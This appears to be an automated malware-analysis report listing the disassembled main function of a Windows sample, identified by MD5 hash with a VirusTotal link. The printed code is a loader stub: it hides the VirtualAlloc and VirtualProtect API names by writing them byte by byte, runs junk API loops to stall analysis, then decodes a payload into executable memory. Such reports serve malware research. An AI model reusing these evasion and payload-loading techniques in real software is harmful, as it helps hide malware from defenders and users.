---
layout: post
title:  "main @ 950fc8a60b5bfd2ed28e8806b8cb3a4d"
date:   2021-08-30 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** main
- **Origin (md5):** 950fc8a60b5bfd2ed28e8806b8cb3a4d
- **VirusTotal:** [virustotal.com/gui/file/950fc8a60b5bfd2ed28e8806b8cb3a4d][virustotal_ref]

# Code Tags
<span class="tag" id="LINKING">LINKING</span>


# Similar Functions

1. [fcn.00405205][similar_1_ref] (sim.: 0.881463290696655)
2. [fcn.00405042][similar_2_ref] (sim.: 0.8786945312209826)
3. [fcn.00405042][similar_3_ref] (sim.: 0.8786945312209826)
4. [fcn.00404eb9][similar_4_ref] (sim.: 0.8786945312209826)
5. [fcn.00404eb9][similar_5_ref] (sim.: 0.8786945312209826)


# Disassembled Code

{% highlight nasm %}
push ebp
mov ebp,esp
and esp,0xfffffff8
sub esp,0x1d4
push ebx
push esi
push edi
lea eax,[esp+0x38]
push eax
call fcn.00404657
mov esi,0x5f8
xor ebx,ebx
lea eax,[esp+0xc0]
push eax
push ebx
push ebx
call dword[sym.imp.KERNEL32.dll_GetCPInfoExA]
dec esi
jne 0x41828c
push 0x4033a8
call dword[sym.imp.KERNEL32.dll_GetModuleHandleA]
mov esi,dword[sym.imp.KERNEL32.dll_GetProcAddress]
mov edi,str.zelokaxefamolaliyevexefakiwobe
push edi
push eax
mov dword[esp+0x20],eax
mov byte[str.zelokaxefamolaliyevexefakiwobe],0x56
mov byte[0x41b121],0x69
mov byte[0x41b122],0x72
mov byte[0x41b123],0x74
mov byte[0x41b124],0x75
mov byte[0x41b125],0x61
mov byte[0x41b126],0x6c
mov byte[0x41b127],0x50
mov byte[0x41b128],0x72
mov byte[0x41b129],0x6f
mov byte[0x41b12a],0x74
mov byte[0x41b12b],0x65
mov byte[0x41b12c],0x63
mov byte[0x41b12d],0x74
mov byte[0x41b12e],bl
call esi
mov dword[0x41c9a8],eax
mov eax,dword[0x41bd24]
mov dword[0x41cab8],eax
mov dword[esp+0xc],ebx
cmp dword[esp+0xc],0x7ca
jne 0x41834c
add dword[0x41cab8],0x38c77
cmp dword[esp+0xc],0x20a
jge 0x41835d
push ebx
call dword[sym.imp.KERNEL32.dll_SetConsoleOutputCP]
inc dword[esp+0xc]
cmp dword[esp+0xc],0xcfa
jl 0x418338
push edi
push dword[esp+0x1c]
mov byte[0x41b127],0x41
mov byte[0x41b128],0x6c
mov byte[0x41b129],0x6c
mov byte[0x41b12a],0x6f
mov byte[0x41b12b],0x63
mov byte[0x41b12c],bl
call esi
push 0x40
push 0x1000
push dword[0x41cab8]
mov dword[0x41c9ac],eax
push ebx
call eax
mov edi,eax
mov eax,dword[0x41b018]
add eax,0x38c77
xor esi,esi
cmp dword[0x41cab8],ebx
jbe 0x4183fc
mov dword[esp+0xc],eax
sub dword[esp+0xc],edi
cmp esi,0x8c9
jge 0x4183e4
push ebx
call dword[sym.imp.KERNEL32.dll_SetLastError]
push ebx
call dword[sym.imp.KERNEL32.dll_FindAtomA]
mov eax,dword[esp+0xc]
lea ecx,[esi+edi]
mov al,byte[eax+ecx]
call fcn.004180d6
inc esi
cmp esi,dword[0x41cab8]
jb 0x4183ce
mov dword[esp+0x10],0xbb
sub dword[esp+0x10],0x7b
xor esi,esi
cmp esi,0x70f
jge 0x41842f
lea eax,[esp+0xc0]
push eax
push ebx
push ebx
call dword[sym.imp.KERNEL32.dll_GetCPInfoExA]
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
call dword[sym.imp.KERNEL32.dll_CompareStringW]
inc esi
cmp esi,0xf2dc6
jl 0x41840b
lea eax,[esp+0x14]
push eax
push dword[esp+0x14]
push dword[0x41cab8]
push edi
call dword[0x41c9a8]
push edi
call fcn.0041823a
pop ecx
xor esi,esi
cmp esi,0x243478
jne 0x418466
push edi
call fcn.004180d9
pop ecx
cmp esi,0xc00
jge 0x41847b
push ebx
call dword[sym.imp.KERNEL32.dll_GetConsoleSelectionInfo]
call dword[sym.imp.KERNEL32.dll_SetFileApisToANSI]
inc esi
cmp esi,0x2d3db4
jl 0x418457
mov eax,dword fs:[0x2c]
mov eax,dword[eax]
xor esi,esi
push 0x4033b8
inc esi
push 0x4033fc
mov dword[eax+4],esi
call dword[sym.imp.KERNEL32.dll_WriteProfileSectionA]
push 0x40341c
lea ecx,[esp+0x20]
call fcn.00404439
push ebx
push esi
lea ecx,[esp+0x24]
call fcn.00404e15
lea ecx,[esp+0x8c]
call fcn.00404700
lea eax,[esp+0x8c]
push eax
mov dword[esp+0x90],0x403480
call fcn.00405413
pop ecx
pop edi
pop esi
xor eax,eax
pop ebx
mov esp,ebp
pop ebp
ret 0x10
{% endhighlight %}


[similar_1_ref]: /report/fcn.00405205@510c8408eb3f0420e19240592ddc0b5b
[similar_2_ref]: /report/fcn.00405042@06689e718004fe3ee3bfc132b456240e
[similar_3_ref]: /report/fcn.00405042@3a780067b4fcdbc523bd6f0e3b89f181
[similar_4_ref]: /report/fcn.00404eb9@045e0ff2c8ee6fdcaf20f3769c6f3c76
[similar_5_ref]: /report/fcn.00404eb9@595b48effa204acca09e846b8e091f46
[virustotal_ref]: https://www.virustotal.com/gui/file/950fc8a60b5bfd2ed28e8806b8cb3a4d